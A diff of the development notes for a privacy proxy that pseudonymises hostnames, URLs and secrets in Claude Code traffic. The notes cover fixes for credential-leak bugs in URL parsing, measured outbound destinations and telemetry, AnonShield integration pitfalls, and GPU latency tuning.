+## Second adversarial review (2026-08-02, after /simplify)
+
+Flaws found AFTER two review passes — all fixed, all with regression tests in
+`tests/test_review_regressions.py`:
+- **CRITICAL — URL password in clear.** `_fake_authority` split on the first
+  colon: `https://alice:password@real.host/` gave `alice` as the host and
+  copied `:password@real.host` as the port. The password AND the real domain
+  left. RFC 3986 applied; credentials are now treated as secrets (D4).
+- **CRITICAL — token restorable through the vault.** A repository URL carrying
+  a token (`https://oauth2:ghp_…@github.com/org/repo`) stored the token in the
+  `real` column: it became restorable again, breaching D4. Userinfo is stripped
+  before canonicalisation.
+- **CRITICAL — unregistered URL host.** `_fake_authority` called `_fake_host`
+  directly, outside the vault: the surrogate stayed free and ANOTHER real host
+  could obtain it → restoration pointed at the wrong machine (D6). It now goes
+  through `substitute_value`.
+- **MAJOR — URL fragment (`#…`) never substituted**: treated as a `name=value`
+  pair, hence ignored. `#tenant-acme-nda` went out in clear.
+- **MAJOR — IPv6 without brackets**: everything after the first colon was
+  copied as is.
+- **MAJOR — a URL reduced to a host got its own identity**, hence two fictional
+  machines for one real server.
+- **MODERATE — a lexicon word could coincide with a word in the real value**
+  (`gateway-021` → `gateway-registry-021`, ~2 % of cases): the draw now avoids
+  words present in the input.
+- **Complacent tests**: the FakeDetector guard accepted PARTIAL coverage
+  (`c in real`) — a weakened e-mail pattern let `alice.dupont` leak without any
+  test complaining; the overlap assertion looked for a single substring; the
+  unique-identity test forgot the URL type. All three hardened, plus assertions
+  on PARTIAL leaks.
+
+**Regression introduced then fixed during those fixes**: unifying the bare host
+brought two vault entries into conflict for one surrogate (`https://x` vs
+`https://x/`, spans with truncation points) — a 503 mid-session, caught by
+`phase3_e2e.sh` and not by the unit tests. That is the argument for keeping
+real E2E proofs.
+
+## Accepted deviations for jo to validate
+
+- **Cloud allowlist tightened vs §6 of the plan**: a literal `*.amazonaws.com`
+  let `db-prod.cluster-abc123.eu-west-3.rds.amazonaws.com` leak (a RESOURCE
+  endpoint, carrying the account identifier). Only the form
+  `<service>[.<region>].<cloud>` is allowlisted. Measured by `corpus_eval.py`.
+- **`SERVICE` (cyber model) classified PUBLIC**: it fires massively on
+  technical prose. To be reassessed on the real corpus.
+- **Shared attributes excluded from the restoration view**: otherwise a
+  hallucinated surrogate (`canyon-02-prod.<known zone>`) was partially resolved
+  into `canyon-02-prod.<REAL zone>` — a fictional host disguised as a real one
+  (D5).
+
+## Phase 0 findings (2026-08-01) — updated 2026-08-02
+
+- **Datadog**: on 2026-08-01, ~343 KB were going to
+  `http-intake.logs.us5.datadoghq.com` (statsig feature flag
+  `tengu_log_datadog_events`, ~15 s flush). On 2026-08-02,
+  `tests/datadog_probe.sh` catches nothing — but **that is not proof**: jo has
+  since set `CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1`,
+  `DISABLE_TELEMETRY=1`, `DISABLE_ERROR_REPORTING=1` and `DO_NOT_TRACK` in the
+  Claude Code settings. Claude Code injects those variables regardless of the
+  script's environment, so the probe ran with telemetry ALREADY off. Tenable
+  conclusion: the switch works. The CONTENT of the payloads remains
+  uninspected. To measure it some day, those variables must be neutralised at
+  the settings level (`--settings` on a temporary file), not in the
+  environment. Datadog is deliberately ABSENT from `known_destinations.json`:
+  its reappearance must FAIL the guard.
+- **Four destinations out of five escape the proxy** (measured):
   `mcp-proxy.anthropic.com` ×12, `mcp.context7.com` ×11, `registry.npmjs.org`
-  ×4, `api.githubcopilot.com` ×2 — contre `api.anthropic.com` ×5 qui est le
-  seul canal 1. Détail et politique pare-feu : `docs/d9-blocage-reseau.md`.
-- `mcp-proxy.anthropic.com` (connecteurs claude.ai Gmail/Calendar/Drive) ne
-  passe PAS par `ANTHROPIC_BASE_URL` → il échappera au proxy de la Phase 3.
-  Surface canal 2, à traiter par PreToolUse en Phase 4.
-- `api.githubcopilot.com` = serveur MCP distant du plugin github officiel.
-- La télémétrie passe aussi PAR `api.anthropic.com` (`/api/event_logging/…`,
-  `/api/claude_cli/bootstrap`…) → en Phase 3, le proxy ne réécrit que
-  `/v1/messages` et `count_tokens` ; le reste transite tel quel et reste
-  surveillé par ce harnais.
-- Limite du harnais : proxy explicite (`HTTPS_PROXY`) — un processus en
-  sockets bruts le contourne ; réponse définitive = D9 (pare-feu, Phase 6).
+  ×4, `api.githubcopilot.com` ×2 — against `api.anthropic.com` ×5, which is the
+  only channel 1. Detail and firewall policy: `docs/d9-network-isolation.md`.
+- `mcp-proxy.anthropic.com` (claude.ai Gmail/Calendar/Drive connectors) does
+  NOT go through `ANTHROPIC_BASE_URL` → it escapes the Phase 3 proxy.
+  Channel-2 surface, handled by PreToolUse in Phase 4.
+- `api.githubcopilot.com` = the remote MCP server of the official github plugin.
+- Telemetry also goes THROUGH `api.anthropic.com`
+  (`/api/event_logging/…`, `/api/claude_cli/bootstrap`…) → in Phase 3 the proxy
+  only rewrites `/v1/messages` and `count_tokens`; the rest passes through and
+  stays watched by this harness.
+- Harness limit: explicit proxy (`HTTPS_PROXY`) — a process using raw sockets
+  bypasses it; the definitive answer is D9 (firewall, Phase 6).
 
-## Notes d'intégration AnonShield (Phase 1 — API lue le 2026-08-01)
-- Upstream épinglé `d82f917` (2026-07-27), cloné dans
-  `services/anonshield/upstream/` (gitignoré) depuis `.repos/anonshield`.
-  Wrapper : `services/anonshield/wrapper/` (GPL-3.0), port 9000, `run.sh`.
-- **Clé** : `ANON_SECRET_KEY_FILE` est supporté nativement par
-  `src/anon/security.py` (priorité sur `ANON_SECRET_KEY`). Persistée par
-  run.sh dans `~/.local/state/anonproxy/anon_secret_key` (0600), JAMAIS
-  affichée. Sauvegarder ce dossier : clé + base = les deux moitiés du secret.
-- **Chemin API retenu** : `AnonymizationOrchestrator(strategy_name="filtered",
-  transformer_model=…)` puis `.analyzer_engine.analyzer_engine.analyze()`
-  (l'`AnalyzerEngine` presidio interne — seul chemin qui renvoie les SCORES).
-  Mode `regex` (gros volumes) : `EntityDetector.extract_regex_entities()`,
-  zéro NER. Périmètre d'entités : `get_supported_entities("filtered")` =
-  types custom + mapping du modèle, PAS les builtins presidio (faux positifs).
-- **Pièges** : (1) `import src.anon.config` lit la clé À L'IMPORT → run.sh pose
-  l'env AVANT ; (2) `orchestrator.detect_entities()` ne renvoie pas les scores
-  et saute les textes sans entités → ne pas l'utiliser ; (3) `engine.py` patche
-  `HFTokenPipe` à l'import (fenêtre glissante >400 tokens) — le warm-up doit
-  passer un texte long pour chauffer ce chemin ; (4) fastapi/uvicorn ne sont
-  PAS dans les deps de base et torch est épinglé CPU dans le lock →
-  `wrapper/install-cuda.sh` après CHAQUE `uv sync`/`uv run` dans upstream/
-  (uv run re-sync le lock !) ; lancement service via `.venv/bin/python`
-  direct uniquement (run.sh). Évite aussi celery/redis/pt_core du groupe web.
-- Mapping SecureModernBERT : DOMAIN→HOSTNAME, IPV4/6→IP_ADDRESS,
-  MD5/SHA1/SHA256→HASH, FILEPATH→FILE_PATH, + ORG/LOC/EMAIL/URL/CVE….
-- Recognizers regex fournis couvrant la future classe SECRET (Phase 2) :
-  `AUTH_TOKEN`, `JWT`, `PRIVATE_KEY_PEM`, `PASSWORD_CONTEXT`,
-  `COOKIE_SESSION`, `CERT_*`, `RSA_MODULUS`, `PGP_BLOCK`.
-- Config en TERRAIN NEUTRE : `config/allowlist.txt` (§6, exact + `re:`
-  full-match) et `config/custom_patterns.json` (exemples synthétiques — les
-  conventions RÉELLES s'écrivent avec jo, de préférence après Phase 3). Le
-  service de détection ET le moteur de substituts les lisent : « ce token est
-  public » ne se maintient qu'à un seul endroit. Le PARSEUR est dupliqué de
-  part et d'autre de la frontière D7 (dix lignes, contre une dépendance de
-  licence) — c'est la liste qui compte, pas le code de lecture.
+## AnonShield integration notes (Phase 1 — API read 2026-08-01)
 
-## Latence Phase 1 — RÉSOLUE (2026-08-02, décision jo : option a, reboot + CUDA)
-- Historique : en CPU le critère <150 ms était inatteignable (fp32 ~800 ms,
-  int8 567 ms, spaCy 22 ms — il manquait ~6×). Le reboot a réparé le mismatch
-  pilote NVIDIA ; RTX 4090 Laptop 16 Go opérationnelle.
-- **Déviation CUDA documentée et scriptée** : `wrapper/install-cuda.sh`
-  installe torch 2.13.0+cu130 (`--reinstall` obligatoire : sinon uv considère
-  le wheel +cpu du lock comme satisfaisant) + fastapi/uvicorn.
-- **PIÈGE uv critique** : `uv sync` ET `uv run` (sync implicite) restaurent
-  les wheels CPU du lock et retirent fastapi/uvicorn → ré-exécuter
-  `install-cuda.sh` après tout `uv sync`/`uv run` dans upstream/ ; le service
-  se lance UNIQUEMENT via `.venv/bin/python` direct (fait par run.sh).
-- Index cu128 sans torch 2.13.0 ; cu130/cu129/cu126 l'ont (pilote 580 =
-  famille CUDA 13 → cu130 retenu).
-- Résultat final : P95 100,6 ms (min 94,5 / p50 99,3 / max 101,5) sur 2 Ko,
-  30 requêtes, stabilité 99,6/97,6 ms entre moitiés ; regex 2,1 ms ;
-  chargement 12,3 s (cache HF).
-- Fait notable (à réévaluer en Phase 5) : sur le texte de log synthétique, le
-  NER brut renvoie 0 entité — TOUTES les détections viennent des recognizers
-  regex. Le rapport coût/valeur du modèle sur des logs infra reste à mesurer
-  sur le corpus doré.
+- Upstream pinned at `d82f917` (2026-07-27), cloned into
+  `services/anonshield/upstream/` (gitignored) from `.repos/anonshield`.
+  Wrapper: `services/anonshield/wrapper/` (GPL-3.0), port 9000, `run.sh`.
+- **Master secret**: AnonShield natively supports pointing at a key FILE
+  through the environment, and that takes precedence over the inline variable.
+  `run.sh` persists it in the state directory (0600) and NEVER prints it. Back
+  up that directory: the secret and the store are the two halves.
+- **Chosen API path**: `AnonymizationOrchestrator(strategy_name="filtered",
+  transformer_model=…)` then `.analyzer_engine.analyzer_engine.analyze()` (the
+  internal presidio `AnalyzerEngine` — the only path that returns SCORES).
+  `regex` mode (large volumes): `EntityDetector.extract_regex_entities()`, no
+  NER at all. Entity perimeter: `get_supported_entities("filtered")` = custom
+  types plus the model's mapping, NOT the presidio builtins (false positives).
+- **Traps**: (1) `import src.anon.config` reads the secret AT IMPORT → run.sh
+  sets the environment FIRST; (2) `orchestrator.detect_entities()` does not
+  return scores and skips texts with no entities → do not use it; (3)
+  `engine.py` patches `HFTokenPipe` at import (sliding window >400 tokens) —
+  the warm-up must pass a long text to warm that path; (4) fastapi/uvicorn are
+  NOT in the base deps and torch is pinned CPU in the lock →
+  `wrapper/install-cuda.sh` after EVERY `uv sync`/`uv run` inside `upstream/`
+  (uv run re-syncs the lock!); launch the service via `.venv/bin/python`
+  directly only (run.sh). This also avoids celery/redis/pt_core from the web
+  group.
+- SecureModernBERT mapping: DOMAIN→HOSTNAME, IPV4/6→IP_ADDRESS,
+  MD5/SHA1/SHA256→HASH, FILEPATH→FILE_PATH, plus ORG/LOC/EMAIL/URL/CVE….
+- Supplied regex recognizers covering the future SECRET class (Phase 2):
+  `AUTH_TOKEN`, `JWT`, `PRIVATE_KEY_PEM`, `PASSWORD_CONTEXT`, `COOKIE_SESSION`,
+  `CERT_*`, `RSA_MODULUS`, `PGP_BLOCK`.
+- Config on NEUTRAL ground: `config/allowlist.txt` (§6, exact plus `re:`
+  full-match) and `config/custom_patterns.json` (synthetic examples — the REAL
+  conventions get written with jo, preferably after Phase 3). Both the
+  detection service AND the surrogate engine read them: "this token is public"
+  is maintained in one place. The PARSER is duplicated on either side of the D7
+  boundary (ten lines, versus a licence dependency) — it is the list that
+  matters, not the code that reads it.
 
-## Environnement (relevé 2026-08-01)
-uv 0.11.32 · Python 3.12.3 · node 24 · claude 2.1.220 · kubectl + kind +
-docker présents · mitmproxy via `uv tool install mitmproxy` · Phase 0 sans
-pyproject (stdlib seul) ; le packaging uv arrive avec les Phases 1-2.
+## Phase 1 latency — RESOLVED (2026-08-02, jo's decision: option a, reboot + CUDA)
+
+- History: on CPU the <150 ms criterion was unreachable (fp32 ~800 ms, int8
+  567 ms, spaCy 22 ms — about 6× short). The reboot fixed the NVIDIA driver
+  mismatch; RTX 4090 Laptop 16 GB operational.
+- **Documented, scripted CUDA deviation**: `wrapper/install-cuda.sh` installs
+  torch 2.13.0+cu130 (`--reinstall` is mandatory: otherwise uv considers the
+  lock's +cpu wheel satisfactory) plus fastapi/uvicorn.
+- **Critical uv trap**: `uv sync` AND `uv run` (implicit sync) restore the
+  lock's CPU wheels and remove fastapi/uvicorn → re-run `install-cuda.sh` after
+  any `uv sync`/`uv run` inside `upstream/`; the service starts ONLY via
+  `.venv/bin/python` directly (run.sh does this).
+- The cu128 index has no torch 2.13.0; cu130/cu129/cu126 do (driver 580 = CUDA
+  13 family → cu130 chosen).
+- Final result: P95 100.6 ms (min 94.5 / p50 99.3 / max 101.5) on 2 KB, 30
+  requests, stability 99.6/97.6 ms between halves; regex 2.1 ms; load 12.3 s
+  (HF cache).
+- Notable fact (to reassess in Phase 5): on synthetic log text the raw NER
+  returns 0 entities — ALL detections come from the regex recognizers. The
+  cost/value ratio of the model on infrastructure logs remains to be measured
+  on the golden corpus.
+
+## Environment (surveyed 2026-08-01, updated 2026-08-06)
+
+uv 0.11.32 · Python 3.12.3 · node 24 · claude 2.1.220 · Go 1.26 · devbox 0.17.5
+· kubectl + kind + docker present · mitmproxy via `uv tool install mitmproxy`.
+Phase 0 had no pyproject (stdlib only); uv packaging arrived with Phases 1-2;
+the Go module lives in `go/` and is driven by the Taskfile.
